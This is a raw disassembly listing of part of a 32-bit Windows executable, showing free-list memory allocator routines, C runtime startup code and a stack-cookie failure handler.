  40ccee:	mov    edx,DWORD PTR [ebp+0x8]
  40ccf1:	cmp    edx,edi
  40ccf3:	jl     0x40cd63
  40ccf5:	cmp    edi,0x200
  40ccfb:	jl     0x40cd0d
  40ccfd:	push   edx
  40ccfe:	push   ebx
  40ccff:	call   DWORD PTR ds:0x424428
  40cd05:	add    esp,0x8
  40cd08:	pop    edi
  40cd09:	pop    esi
  40cd0a:	pop    ebx
  40cd0b:	pop    ebp
  40cd0c:	ret    
  40cd0d:	mov    ecx,DWORD PTR ds:0x422b9c
  40cd13:	lea    eax,[ebx+edi*1]
  40cd16:	cmp    eax,ecx
  40cd18:	jne    0x40cd3f
  40cd1a:	mov    esi,DWORD PTR ds:0x422ba0
  40cd20:	mov    eax,edx
  40cd22:	sub    eax,edi
  40cd24:	cmp    esi,eax
  40cd26:	jl     0x40cd3f
  40cd28:	sub    esi,eax
  40cd2a:	add    ecx,eax
  40cd2c:	mov    DWORD PTR ds:0x422ba0,esi
  40cd32:	mov    DWORD PTR ds:0x422b9c,ecx
  40cd38:	mov    eax,ebx
  40cd3a:	pop    edi
  40cd3b:	pop    esi
  40cd3c:	pop    ebx
  40cd3d:	pop    ebp
  40cd3e:	ret    
  40cd3f:	mov    ecx,edx
  40cd41:	call   0x40cc20
  40cd46:	push   edi
  40cd47:	mov    esi,eax
  40cd49:	push   ebx
  40cd4a:	push   esi
  40cd4b:	call   0x40db6c
  40cd50:	add    esp,0xc
  40cd53:	mov    edx,edi
  40cd55:	mov    ecx,ebx
  40cd57:	call   0x40ccb0
  40cd5c:	pop    edi
  40cd5d:	mov    eax,esi
  40cd5f:	pop    esi
  40cd60:	pop    ebx
  40cd61:	pop    ebp
  40cd62:	ret    
  40cd63:	xor    edx,edx
  40cd65:	mov    ecx,0x5dc
  40cd6a:	call   0x407110
  40cd6f:	int3   
  40cd70:	push   ecx
  40cd71:	push   esi
  40cd72:	mov    esi,ecx
  40cd74:	push   edi
  40cd75:	cmp    esi,0x200
  40cd7b:	jl     0x40cd86
  40cd7d:	call   0x40c940
  40cd82:	pop    edi
  40cd83:	pop    esi
  40cd84:	pop    ecx
  40cd85:	ret    
  40cd86:	cmp    esi,0x4
  40cd89:	jae    0x40cd90
  40cd8b:	mov    esi,0x4
  40cd90:	mov    edi,DWORD PTR [esi*4+0x421378]
  40cd97:	test   edi,edi
  40cd99:	je     0x40cdb6
  40cd9b:	mov    ecx,DWORD PTR [edi]
  40cd9d:	push   esi
  40cd9e:	push   0x0
  40cda0:	push   edi
  40cda1:	mov    DWORD PTR [esi*4+0x421378],ecx
  40cda8:	call   0x40db72
  40cdad:	add    esp,0xc
  40cdb0:	mov    eax,edi
  40cdb2:	pop    edi
  40cdb3:	pop    esi
  40cdb4:	pop    ecx
  40cdb5:	ret    
  40cdb6:	mov    eax,ds:0x422b98
  40cdbb:	cmp    eax,esi
  40cdbd:	jge    0x40cde4
  40cdbf:	cmp    eax,0x4
  40cdc2:	jb     0x40cdd1
  40cdc4:	mov    ecx,DWORD PTR ds:0x422b94
  40cdca:	mov    edx,eax
  40cdcc:	call   0x40ce00
  40cdd1:	mov    ecx,0x200
  40cdd6:	call   0x40c940
  40cddb:	mov    ecx,eax
  40cddd:	mov    eax,0x200
  40cde2:	jmp    0x40cdea
  40cde4:	mov    ecx,DWORD PTR ds:0x422b94
  40cdea:	sub    eax,esi
  40cdec:	mov    ds:0x422b98,eax
  40cdf1:	mov    eax,ecx
  40cdf3:	add    ecx,esi
  40cdf5:	pop    edi
  40cdf6:	mov    DWORD PTR ds:0x422b94,ecx
  40cdfc:	pop    esi
  40cdfd:	pop    ecx
  40cdfe:	ret    
  40cdff:	int3   
  40ce00:	cmp    edx,0x200
  40ce06:	jge    0x40c970
  40ce0c:	cmp    edx,0x4
  40ce0f:	jae    0x40ce16
  40ce11:	mov    edx,0x4
  40ce16:	mov    eax,DWORD PTR [edx*4+0x421378]
  40ce1d:	mov    DWORD PTR [ecx],eax
  40ce1f:	mov    DWORD PTR [edx*4+0x421378],ecx
  40ce26:	ret    
  40ce27:	int3   
  40ce28:	int3   
  40ce29:	int3   
  40ce2a:	int3   
  40ce2b:	int3   
  40ce2c:	int3   
  40ce2d:	int3   
  40ce2e:	int3   
  40ce2f:	int3   
  40ce30:	push   ecx
  40ce31:	push   esi
  40ce32:	mov    esi,ecx
  40ce34:	push   edi
  40ce35:	cmp    esi,0x200
  40ce3b:	jl     0x40ce46
  40ce3d:	call   0x40c940
  40ce42:	pop    edi
  40ce43:	pop    esi
  40ce44:	pop    ecx
  40ce45:	ret    
  40ce46:	cmp    esi,0x4
  40ce49:	jae    0x40ce50
  40ce4b:	mov    esi,0x4
  40ce50:	mov    edi,DWORD PTR [esi*4+0x421b78]
  40ce57:	test   edi,edi
  40ce59:	je     0x40ce76
  40ce5b:	mov    ecx,DWORD PTR [edi]
  40ce5d:	push   esi
  40ce5e:	push   0x0
  40ce60:	push   edi
  40ce61:	mov    DWORD PTR [esi*4+0x421b78],ecx
  40ce68:	call   0x40db72
  40ce6d:	add    esp,0xc
  40ce70:	mov    eax,edi
  40ce72:	pop    edi
  40ce73:	pop    esi
  40ce74:	pop    ecx
  40ce75:	ret    
  40ce76:	mov    eax,ds:0x422b90
  40ce7b:	cmp    eax,esi
  40ce7d:	jge    0x40cea4
  40ce7f:	cmp    eax,0x4
  40ce82:	jb     0x40ce91
  40ce84:	mov    ecx,DWORD PTR ds:0x422b8c
  40ce8a:	mov    edx,eax
  40ce8c:	call   0x40cec0
  40ce91:	mov    ecx,0x200
  40ce96:	call   0x40c940
  40ce9b:	mov    ecx,eax
  40ce9d:	mov    eax,0x200
  40cea2:	jmp    0x40ceaa
  40cea4:	mov    ecx,DWORD PTR ds:0x422b8c
  40ceaa:	sub    eax,esi
  40ceac:	mov    ds:0x422b90,eax
  40ceb1:	mov    eax,ecx
  40ceb3:	add    ecx,esi
  40ceb5:	pop    edi
  40ceb6:	mov    DWORD PTR ds:0x422b8c,ecx
  40cebc:	pop    esi
  40cebd:	pop    ecx
  40cebe:	ret    
  40cebf:	int3   
  40cec0:	cmp    edx,0x200
  40cec6:	jge    0x40c970
  40cecc:	cmp    edx,0x4
  40cecf:	jae    0x40ced6
  40ced1:	mov    edx,0x4
  40ced6:	mov    eax,DWORD PTR [edx*4+0x421b78]
  40cedd:	mov    DWORD PTR [ecx],eax
  40cedf:	mov    DWORD PTR [edx*4+0x421b78],ecx
  40cee6:	ret    
  40cee7:	int3   
  40cee8:	int3   
  40cee9:	int3   
  40ceea:	int3   
  40ceeb:	int3   
  40ceec:	int3   
  40ceed:	int3   
  40ceee:	int3   
  40ceef:	int3   
  40cef0:	push   ecx
  40cef1:	push   esi
  40cef2:	mov    esi,ecx
  40cef4:	push   edi
  40cef5:	cmp    esi,0x200
  40cefb:	jl     0x40cf06
  40cefd:	call   0x40c940
  40cf02:	pop    edi
  40cf03:	pop    esi
  40cf04:	pop    ecx
  40cf05:	ret    
  40cf06:	cmp    esi,0x4
  40cf09:	jae    0x40cf10
  40cf0b:	mov    esi,0x4
  40cf10:	mov    edi,DWORD PTR [esi*4+0x422378]
  40cf17:	test   edi,edi
  40cf19:	je     0x40cf36
  40cf1b:	mov    ecx,DWORD PTR [edi]
  40cf1d:	push   esi
  40cf1e:	push   0x0
  40cf20:	push   edi
  40cf21:	mov    DWORD PTR [esi*4+0x422378],ecx
  40cf28:	call   0x40db72
  40cf2d:	add    esp,0xc
  40cf30:	mov    eax,edi
  40cf32:	pop    edi
  40cf33:	pop    esi
  40cf34:	pop    ecx
  40cf35:	ret    
  40cf36:	mov    eax,ds:0x422b88
  40cf3b:	cmp    eax,esi
  40cf3d:	jge    0x40cf64
  40cf3f:	cmp    eax,0x4
  40cf42:	jb     0x40cf51
  40cf44:	mov    ecx,DWORD PTR ds:0x422b84
  40cf4a:	mov    edx,eax
  40cf4c:	call   0x40cf80
  40cf51:	mov    ecx,0x200
  40cf56:	call   0x40c940
  40cf5b:	mov    ecx,eax
  40cf5d:	mov    eax,0x200
  40cf62:	jmp    0x40cf6a
  40cf64:	mov    ecx,DWORD PTR ds:0x422b84
  40cf6a:	sub    eax,esi
  40cf6c:	mov    ds:0x422b88,eax
  40cf71:	mov    eax,ecx
  40cf73:	add    ecx,esi
  40cf75:	pop    edi
  40cf76:	mov    DWORD PTR ds:0x422b84,ecx
  40cf7c:	pop    esi
  40cf7d:	pop    ecx
  40cf7e:	ret    
  40cf7f:	int3   
  40cf80:	cmp    edx,0x200
  40cf86:	jge    0x40c970
  40cf8c:	cmp    edx,0x4
  40cf8f:	jae    0x40cf96
  40cf91:	mov    edx,0x4
  40cf96:	mov    eax,DWORD PTR [edx*4+0x422378]
  40cf9d:	mov    DWORD PTR [ecx],eax
  40cf9f:	mov    DWORD PTR [edx*4+0x422378],ecx
  40cfa6:	ret    
  40cfa7:	int3   
  40cfa8:	int3   
  40cfa9:	int3   
  40cfaa:	int3   
  40cfab:	int3   
  40cfac:	int3   
  40cfad:	int3   
  40cfae:	int3   
  40cfaf:	int3   
  40cfb0:	push   ecx
  40cfb1:	push   esi
  40cfb2:	mov    esi,ecx
  40cfb4:	push   edi
  40cfb5:	cmp    esi,0x200
  40cfbb:	jl     0x40cfc6
  40cfbd:	call   0x40c940
  40cfc2:	pop    edi
  40cfc3:	pop    esi
  40cfc4:	pop    ecx
  40cfc5:	ret    
  40cfc6:	cmp    esi,0x4
  40cfc9:	jae    0x40cfd0
  40cfcb:	mov    esi,0x4
  40cfd0:	mov    edi,DWORD PTR [esi*4+0x420b78]
  40cfd7:	test   edi,edi
  40cfd9:	je     0x40cff6
  40cfdb:	mov    ecx,DWORD PTR [edi]
  40cfdd:	push   esi
  40cfde:	push   0x0
  40cfe0:	push   edi
  40cfe1:	mov    DWORD PTR [esi*4+0x420b78],ecx
  40cfe8:	call   0x40db72
  40cfed:	add    esp,0xc
  40cff0:	mov    eax,edi
  40cff2:	pop    edi
  40cff3:	pop    esi
  40cff4:	pop    ecx
  40cff5:	ret    
  40cff6:	mov    eax,ds:0x422b80
  40cffb:	cmp    eax,esi
  40cffd:	jge    0x40d024
  40cfff:	cmp    eax,0x4
  40d002:	jb     0x40d011
  40d004:	mov    ecx,DWORD PTR ds:0x422b7c
  40d00a:	mov    edx,eax
  40d00c:	call   0x40d040
  40d011:	mov    ecx,0x200
  40d016:	call   0x40c940
  40d01b:	mov    ecx,eax
  40d01d:	mov    eax,0x200
  40d022:	jmp    0x40d02a
  40d024:	mov    ecx,DWORD PTR ds:0x422b7c
  40d02a:	sub    eax,esi
  40d02c:	mov    ds:0x422b80,eax
  40d031:	mov    eax,ecx
  40d033:	add    ecx,esi
  40d035:	pop    edi
  40d036:	mov    DWORD PTR ds:0x422b7c,ecx
  40d03c:	pop    esi
  40d03d:	pop    ecx
  40d03e:	ret    
  40d03f:	int3   
  40d040:	cmp    edx,0x200
  40d046:	jge    0x40c970
  40d04c:	cmp    edx,0x4
  40d04f:	jae    0x40d056
  40d051:	mov    edx,0x4
  40d056:	mov    eax,DWORD PTR [edx*4+0x420b78]
  40d05d:	mov    DWORD PTR [ecx],eax
  40d05f:	mov    DWORD PTR [edx*4+0x420b78],ecx
  40d066:	ret    
  40d067:	int3   
  40d068:	int3   
  40d069:	int3   
  40d06a:	int3   
  40d06b:	int3   
  40d06c:	int3   
  40d06d:	int3   
  40d06e:	int3   
  40d06f:	int3   
  40d070:	push   ebp
  40d071:	mov    ebp,esp
  40d073:	push   ebx
  40d074:	push   esi
  40d075:	push   edi
  40d076:	mov    edi,edx
  40d078:	mov    ebx,ecx
  40d07a:	test   edi,edi
  40d07c:	js     0x40d0f3
  40d07e:	mov    edx,DWORD PTR [ebp+0x8]
  40d081:	cmp    edx,edi
  40d083:	jl     0x40d0f3
  40d085:	cmp    edi,0x200
  40d08b:	jl     0x40d09d
  40d08d:	push   edx
  40d08e:	push   ebx
  40d08f:	call   DWORD PTR ds:0x424428
  40d095:	add    esp,0x8
  40d098:	pop    edi
  40d099:	pop    esi
  40d09a:	pop    ebx
  40d09b:	pop    ebp
  40d09c:	ret    
  40d09d:	mov    ecx,DWORD PTR ds:0x422b7c
  40d0a3:	lea    eax,[ebx+edi*1]
  40d0a6:	cmp    eax,ecx
  40d0a8:	jne    0x40d0cf
  40d0aa:	mov    esi,DWORD PTR ds:0x422b80
  40d0b0:	mov    eax,edx
  40d0b2:	sub    eax,edi
  40d0b4:	cmp    esi,eax
  40d0b6:	jl     0x40d0cf
  40d0b8:	sub    esi,eax
  40d0ba:	add    ecx,eax
  40d0bc:	mov    DWORD PTR ds:0x422b80,esi
  40d0c2:	mov    DWORD PTR ds:0x422b7c,ecx
  40d0c8:	mov    eax,ebx
  40d0ca:	pop    edi
  40d0cb:	pop    esi
  40d0cc:	pop    ebx
  40d0cd:	pop    ebp
  40d0ce:	ret    
  40d0cf:	mov    ecx,edx
  40d0d1:	call   0x40cfb0
  40d0d6:	push   edi
  40d0d7:	mov    esi,eax
  40d0d9:	push   ebx
  40d0da:	push   esi
  40d0db:	call   0x40db6c
  40d0e0:	add    esp,0xc
  40d0e3:	mov    edx,edi
  40d0e5:	mov    ecx,ebx
  40d0e7:	call   0x40d040
  40d0ec:	pop    edi
  40d0ed:	mov    eax,esi
  40d0ef:	pop    esi
  40d0f0:	pop    ebx
  40d0f1:	pop    ebp
  40d0f2:	ret    
  40d0f3:	xor    edx,edx
  40d0f5:	mov    ecx,0x5dc
  40d0fa:	call   0x407110
  40d0ff:	int3   
  40d100:	push   ebp
  40d101:	mov    ebp,esp
  40d103:	push   ecx
  40d104:	push   edi
  40d105:	call   DWORD PTR ds:0x424434
  40d10b:	add    eax,0x20
  40d10e:	push   eax
  40d10f:	call   DWORD PTR ds:0x42442c
  40d115:	push   eax
  40d116:	call   DWORD PTR ds:0x424430
  40d11c:	add    esp,0x8
  40d11f:	mov    edi,eax
  40d121:	push   edi
  40d122:	call   DWORD PTR ds:0x42435c
  40d128:	and    eax,0xffff7fff
  40d12d:	cmp    eax,0x2
  40d130:	je     0x40d136
  40d132:	xor    al,al
  40d134:	jmp    0x40d146
  40d136:	lea    eax,[ebp-0x4]
  40d139:	push   eax
  40d13a:	push   edi
  40d13b:	call   DWORD PTR ds:0x424360
  40d141:	test   eax,eax
  40d143:	setne  al
  40d146:	mov    ds:0x40e8db,al
  40d14b:	call   DWORD PTR ds:0x424434
  40d151:	add    eax,0x40
  40d154:	push   eax
  40d155:	call   DWORD PTR ds:0x42442c
  40d15b:	push   eax
  40d15c:	call   DWORD PTR ds:0x424430
  40d162:	add    esp,0x8
  40d165:	mov    edi,eax
  40d167:	push   edi
  40d168:	call   DWORD PTR ds:0x42435c
  40d16e:	and    eax,0xffff7fff
  40d173:	cmp    eax,0x2
  40d176:	je     0x40d184
  40d178:	mov    BYTE PTR ds:0x40e8da,0x0
  40d17f:	pop    edi
  40d180:	mov    esp,ebp
  40d182:	pop    ebp
  40d183:	ret    
  40d184:	lea    eax,[ebp-0x4]
  40d187:	push   eax
  40d188:	push   edi
  40d189:	call   DWORD PTR ds:0x424360
  40d18f:	test   eax,eax
  40d191:	setne  BYTE PTR ds:0x40e8da
  40d198:	pop    edi
  40d199:	mov    esp,ebp
  40d19b:	pop    ebp
  40d19c:	ret    
  40d19d:	int3   
  40d19e:	int3   
  40d19f:	int3   
  40d1a0:	cmp    BYTE PTR ds:0x40e8db,0x0
  40d1a7:	je     0x40d1ac
  40d1a9:	xor    eax,eax
  40d1ab:	ret    
  40d1ac:	call   DWORD PTR ds:0x424434
  40d1b2:	add    eax,0x20
  40d1b5:	push   eax
  40d1b6:	call   DWORD PTR ds:0x424438
  40d1bc:	add    esp,0x4
  40d1bf:	ret    
  40d1c0:	push   ebp
  40d1c1:	mov    ebp,esp
  40d1c3:	cmp    BYTE PTR ds:0x40e8db,0x0
  40d1ca:	lea    eax,[ebp+0xc]
  40d1cd:	push   eax
  40d1ce:	push   DWORD PTR [ebp+0x8]
  40d1d1:	je     0x40d1de
  40d1d3:	call   DWORD PTR ds:0x42443c
  40d1d9:	add    esp,0x8
  40d1dc:	pop    ebp
  40d1dd:	ret    
  40d1de:	call   DWORD PTR ds:0x424434
  40d1e4:	add    eax,0x20
  40d1e7:	push   eax
  40d1e8:	call   DWORD PTR ds:0x424440
  40d1ee:	add    esp,0xc
  40d1f1:	pop    ebp
  40d1f2:	ret    
  40d1f3:	call   DWORD PTR ds:0x4242c8
  40d1f9:	cmp    al,0x6
  40d1fb:	jae    0x40d21c
  40d1fd:	push   0x401088
  40d202:	call   DWORD PTR ds:0x424364
  40d208:	push   0x4010a4
  40d20d:	push   eax
  40d20e:	call   DWORD PTR ds:0x424368
  40d214:	test   eax,eax
  40d216:	je     0x40d21c
  40d218:	push   0x1
  40d21a:	call   eax
  40d21c:	xor    eax,eax
  40d21e:	ret    
  40d21f:	mov    eax,0x5a4d
  40d224:	cmp    WORD PTR ds:0x400000,ax
  40d22b:	je     0x40d231
  40d22d:	xor    eax,eax
  40d22f:	jmp    0x40d265
  40d231:	mov    ecx,DWORD PTR ds:0x40003c
  40d237:	cmp    DWORD PTR [ecx+0x400000],0x4550
  40d241:	jne    0x40d22d
  40d243:	mov    eax,0x10b
  40d248:	cmp    WORD PTR [ecx+0x400018],ax
  40d24f:	jne    0x40d22d
  40d251:	xor    eax,eax
  40d253:	cmp    DWORD PTR [ecx+0x400074],0xe
  40d25a:	jbe    0x40d265
  40d25c:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40d262:	setne  al
  40d265:	push   0x1
  40d267:	mov    ds:0x40e0d8,eax
  40d26c:	call   DWORD PTR ds:0x424450
  40d272:	pop    ecx
  40d273:	push   0xffffffff
  40d275:	call   DWORD PTR ds:0x424378
  40d27b:	mov    ecx,DWORD PTR ds:0x424470
  40d281:	mov    ds:0x4232b4,eax
  40d286:	mov    ds:0x4232b8,eax
  40d28b:	mov    eax,ds:0x40e40c
  40d290:	mov    DWORD PTR [ecx],eax
  40d292:	mov    ecx,DWORD PTR ds:0x424474
  40d298:	mov    eax,ds:0x40e400
  40d29d:	mov    DWORD PTR [ecx],eax
  40d29f:	call   0x40d9ee
  40d2a4:	call   0x40d9eb
  40d2a9:	cmp    DWORD PTR ds:0x40e000,0x0
  40d2b0:	jne    0x40d2be
  40d2b2:	push   0x40d9eb
  40d2b7:	call   DWORD PTR ds:0x424460
  40d2bd:	pop    ecx
  40d2be:	call   0x40da2e
  40d2c3:	cmp    DWORD PTR ds:0x40e010,0xffffffff
  40d2ca:	jne    0x40d2d5
  40d2cc:	push   0xffffffff
  40d2ce:	call   DWORD PTR ds:0x42445c
  40d2d4:	pop    ecx
  40d2d5:	xor    eax,eax
  40d2d7:	ret    
  40d2d8:	push   0x40da0e
  40d2dd:	call   0x40d582
  40d2e2:	mov    eax,ds:0x40e408
  40d2e7:	mov    DWORD PTR [esp],0x40e0dc
  40d2ee:	push   DWORD PTR ds:0x40e404
  40d2f4:	mov    ds:0x40e0dc,eax
  40d2f9:	push   0x40e0d0
  40d2fe:	push   0x40e0cc
  40d303:	push   0x40e0c8
  40d308:	call   DWORD PTR ds:0x42444c
  40d30e:	add    esp,0x14
  40d311:	mov    ds:0x40e0d4,eax
  40d316:	test   eax,eax
  40d318:	jns    0x40d322
  40d31a:	push   0x8
  40d31c:	call   0x40d7fc
  40d321:	pop    ecx
  40d322:	ret    
  40d323:	push   0xc
  40d325:	push   0x40df38
  40d32a:	call   0x40da70
  40d32f:	xor    ebx,ebx
  40d331:	mov    DWORD PTR [ebp-0x4],ebx
  40d334:	mov    eax,fs:0x18
  40d33a:	mov    edx,DWORD PTR [eax+0x4]
  40d33d:	mov    edi,ebx
  40d33f:	mov    esi,0x4232ac
  40d344:	mov    ecx,edx
  40d346:	xor    eax,eax
  40d348:	lock cmpxchg DWORD PTR [esi],ecx
  40d34c:	test   eax,eax
  40d34e:	je     0x40d35b
  40d350:	cmp    eax,edx
  40d352:	jne    0x40d344
  40d354:	xor    esi,esi
  40d356:	inc    esi
  40d357:	mov    edi,esi
  40d359:	jmp    0x40d35e
  40d35b:	xor    esi,esi
  40d35d:	inc    esi
  40d35e:	cmp    DWORD PTR ds:0x4232b0,esi
  40d364:	jne    0x40d370
  40d366:	push   0x1f
  40d368:	call   0x40d7fc
  40d36d:	pop    ecx
  40d36e:	jmp    0x40d3aa
  40d370:	cmp    DWORD PTR ds:0x4232b0,ebx
  40d376:	jne    0x40d3a4
  40d378:	mov    DWORD PTR ds:0x4232b0,esi
  40d37e:	push   0x401040
  40d383:	push   0x40102c
  40d388:	call   0x40da56
  40d38d:	pop    ecx
  40d38e:	pop    ecx
  40d38f:	test   eax,eax
  40d391:	je     0x40d3aa
  40d393:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d39a:	mov    eax,0xff
  40d39f:	jmp    0x40d482
  40d3a4:	mov    DWORD PTR ds:0x40e0c4,esi
  40d3aa:	cmp    DWORD PTR ds:0x4232b0,esi
  40d3b0:	jne    0x40d3cd
  40d3b2:	push   0x401028
  40d3b7:	push   0x401000
  40d3bc:	call   0x40da5c
  40d3c1:	pop    ecx
  40d3c2:	pop    ecx
  40d3c3:	mov    DWORD PTR ds:0x4232b0,0x2
  40d3cd:	test   edi,edi
  40d3cf:	jne    0x40d3da
  40d3d1:	xor    eax,eax
  40d3d3:	mov    ecx,0x4232ac
  40d3d8:	xchg   DWORD PTR [ecx],eax
  40d3da:	cmp    DWORD PTR ds:0x4232bc,0x0
  40d3e1:	je     0x40d3fc
  40d3e3:	push   0x4232bc
  40d3e8:	call   0x40d860
  40d3ed:	pop    ecx
  40d3ee:	test   eax,eax
  40d3f0:	je     0x40d3fc
  40d3f2:	push   ebx
  40d3f3:	push   0x2
  40d3f5:	push   ebx
  40d3f6:	call   DWORD PTR ds:0x4232bc
  40d3fc:	mov    ecx,DWORD PTR ds:0x40e0d0
  40d402:	mov    eax,ds:0x42446c
  40d407:	mov    DWORD PTR [eax],ecx
  40d409:	push   DWORD PTR ds:0x40e0d0
  40d40f:	push   DWORD PTR ds:0x40e0cc
  40d415:	push   DWORD PTR ds:0x40e0c8
  40d41b:	call   0x407fd0
  40d420:	add    esp,0xc
  40d423:	mov    ds:0x40e0c0,eax
  40d428:	cmp    DWORD PTR ds:0x40e0d8,0x0
  40d42f:	jne    0x40d467
  40d431:	push   eax
  40d432:	call   DWORD PTR ds:0x424394
  40d438:	mov    ecx,DWORD PTR [ebp-0x14]
  40d43b:	mov    eax,DWORD PTR [ecx]
  40d43d:	mov    eax,DWORD PTR [eax]
  40d43f:	mov    DWORD PTR [ebp-0x1c],eax
  40d442:	push   ecx
  40d443:	push   eax
  40d444:	call   0x40d7f6
  40d449:	pop    ecx
  40d44a:	pop    ecx
  40d44b:	ret    
  40d44c:	mov    esp,DWORD PTR [ebp-0x18]
  40d44f:	mov    eax,DWORD PTR [ebp-0x1c]
  40d452:	mov    ds:0x40e0c0,eax
  40d457:	cmp    DWORD PTR ds:0x40e0d8,0x0
  40d45e:	jne    0x40d467
  40d460:	push   eax
  40d461:	call   DWORD PTR ds:0x424454
  40d467:	cmp    DWORD PTR ds:0x40e0c4,0x0
  40d46e:	jne    0x40d47b
  40d470:	call   DWORD PTR ds:0x424458
  40d476:	mov    eax,ds:0x40e0c0
  40d47b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d482:	call   0x40dab5
  40d487:	ret    
  40d488:	call   0x40d951
  40d48d:	jmp    0x40d323
  40d492:	cmp    ecx,DWORD PTR ds:0x40e018
  40d498:	jne    0x40d49c
  40d49a:	repz ret 
  40d49c:	jmp    0x40d5d4
  40d4a1:	cmp    DWORD PTR ds:0x4232b8,0x0
  40d4a8:	je     0x40d4ad
  40d4aa:	xor    eax,eax
  40d4ac:	ret    
  40d4ad:	push   esi
  40d4ae:	push   0x4
  40d4b0:	push   0x20
  40d4b2:	call   DWORD PTR ds:0x424480
  40d4b8:	pop    ecx
  40d4b9:	pop    ecx
  40d4ba:	mov    esi,eax
  40d4bc:	push   esi
  40d4bd:	call   DWORD PTR ds:0x424378
  40d4c3:	mov    ds:0x4232b8,eax
  40d4c8:	mov    ds:0x4232b4,eax
  40d4cd:	test   esi,esi
  40d4cf:	jne    0x40d4d6
  40d4d1:	push   0x18
  40d4d3:	pop    eax
  40d4d4:	pop    esi
  40d4d5:	ret    
  40d4d6:	and    DWORD PTR [esi],0x0
  40d4d9:	xor    eax,eax
  40d4db:	pop    esi
  40d4dc:	ret    
  40d4dd:	push   0x14
  40d4df:	push   0x40df58
  40d4e4:	call   0x40da70
  40d4e9:	push   DWORD PTR ds:0x4232b8
  40d4ef:	mov    esi,DWORD PTR ds:0x424374
  40d4f5:	call   esi
  40d4f7:	mov    DWORD PTR [ebp-0x1c],eax
  40d4fa:	cmp    eax,0xffffffff
  40d4fd:	jne    0x40d50b
  40d4ff:	push   DWORD PTR [ebp+0x8]
  40d502:	call   DWORD PTR ds:0x424488
  40d508:	pop    ecx
  40d509:	jmp    0x40d570
  40d50b:	push   0x8
  40d50d:	call   0x40daec
  40d512:	pop    ecx
  40d513:	and    DWORD PTR [ebp-0x4],0x0
  40d517:	push   DWORD PTR ds:0x4232b8
  40d51d:	call   esi
  40d51f:	mov    DWORD PTR [ebp-0x1c],eax
  40d522:	push   DWORD PTR ds:0x4232b4
  40d528:	call   esi
  40d52a:	mov    DWORD PTR [ebp-0x20],eax
  40d52d:	lea    eax,[ebp-0x20]
  40d530:	push   eax
  40d531:	lea    eax,[ebp-0x1c]
  40d534:	push   eax
  40d535:	push   DWORD PTR [ebp+0x8]
  40d538:	mov    esi,DWORD PTR ds:0x424378
  40d53e:	call   esi
  40d540:	push   eax
  40d541:	call   0x40daf8
  40d546:	add    esp,0xc
  40d549:	mov    edi,eax
  40d54b:	mov    DWORD PTR [ebp-0x24],edi
  40d54e:	push   DWORD PTR [ebp-0x1c]
  40d551:	call   esi
  40d553:	mov    ds:0x4232b8,eax
  40d558:	push   DWORD PTR [ebp-0x20]
  40d55b:	call   esi
  40d55d:	mov    ds:0x4232b4,eax
  40d562:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d569:	call   0x40d579
  40d56e:	mov    eax,edi
  40d570:	call   0x40dab5
  40d575:	ret    
  40d576:	mov    edi,DWORD PTR [ebp-0x24]
  40d579:	push   0x8
  40d57b:	call   0x40daf2
  40d580:	pop    ecx
  40d581:	ret    
  40d582:	push   ebp
  40d583:	mov    ebp,esp
  40d585:	push   DWORD PTR [ebp+0x8]
  40d588:	call   0x40d4dd
  40d58d:	neg    eax
  40d58f:	sbb    eax,eax
  40d591:	neg    eax
  40d593:	pop    ecx
  40d594:	dec    eax
  40d595:	pop    ebp
  40d596:	ret    
  40d597:	push   ebp
  40d598:	mov    ebp,esp
  40d59a:	call   DWORD PTR ds:0x424370
  40d5a0:	push   0x1
  40d5a2:	mov    ds:0x40e3fc,eax
  40d5a7:	call   0x40dafe
  40d5ac:	push   DWORD PTR [ebp+0x8]
  40d5af:	call   0x40db04
  40d5b4:	cmp    DWORD PTR ds:0x40e3fc,0x0
  40d5bb:	pop    ecx
  40d5bc:	pop    ecx
  40d5bd:	jne    0x40d5c7
  40d5bf:	push   0x1
  40d5c1:	call   0x40dafe
  40d5c6:	pop    ecx
  40d5c7:	push   0xc0000409
  40d5cc:	call   0x40db0a
  40d5d1:	pop    ecx
  40d5d2:	pop    ebp
  40d5d3:	ret    
  40d5d4:	push   ebp
  40d5d5:	mov    ebp,esp
  40d5d7:	sub    esp,0x324
  40d5dd:	push   0x17
  40d5df:	call   0x40db2e
  40d5e4:	test   eax,eax
  40d5e6:	je     0x40d5ed
  40d5e8:	push   0x2
  40d5ea:	pop    ecx
  40d5eb:	int    0x29
  40d5ed:	mov    ds:0x40e1e0,eax
  40d5f2:	mov    DWORD PTR ds:0x40e1dc,ecx
  40d5f8:	mov    DWORD PTR ds:0x40e1d8,edx
  40d5fe:	mov    DWORD PTR ds:0x40e1d4,ebx
  40d604:	mov    DWORD PTR ds:0x40e1d0,esi
  40d60a:	mov    DWORD PTR ds:0x40e1cc,edi
  40d610:	data16 mov WORD PTR ds:0x40e1f8,ss
  40d617:	data16 mov WORD PTR ds:0x40e1ec,cs
  40d61e:	data16 mov WORD PTR ds:0x40e1c8,ds
  40d625:	data16 mov WORD PTR ds:0x40e1c4,es
  40d62c:	data16 mov WORD PTR ds:0x40e1c0,fs
  40d633:	data16 mov WORD PTR ds:0x40e1bc,gs
  40d63a:	pushf  
  40d63b:	pop    DWORD PTR ds:0x40e1f0
  40d641:	mov    eax,DWORD PTR [ebp+0x0]
  40d644:	mov    ds:0x40e1e4,eax
  40d649:	mov    eax,DWORD PTR [ebp+0x4]
  40d64c:	mov    ds:0x40e1e8,eax
  40d651:	lea    eax,[ebp+0x8]
  40d654:	mov    ds:0x40e1f4,eax
  40d659:	mov    eax,DWORD PTR [ebp-0x324]
  40d65f:	mov    DWORD PTR ds:0x40e130,0x10001
  40d669:	mov    eax,ds:0x40e1e8
  40d66e:	mov    ds:0x40e0ec,eax
  40d673:	mov    DWORD PTR ds:0x40e0e0,0xc0000409
  40d67d:	mov    DWORD PTR ds:0x40e0e4,0x1
  40d687:	mov    DWORD PTR ds:0x40e0f0,0x1
  40d691:	push   0x4
  40d693:	pop    eax
  40d694:	imul   eax,eax,0x0
  40d697:	mov    DWORD PTR [eax+0x40e0f4],0x2
  40d6a1:	push   0x4
  40d6a3:	pop    eax
  40d6a4:	imul   eax,eax,0x0
  40d6a7:	mov    ecx,DWORD PTR ds:0x40e018
  40d6ad:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40d6b1:	push   0x4
  40d6b3:	pop    eax
  40d6b4:	shl    eax,0x0
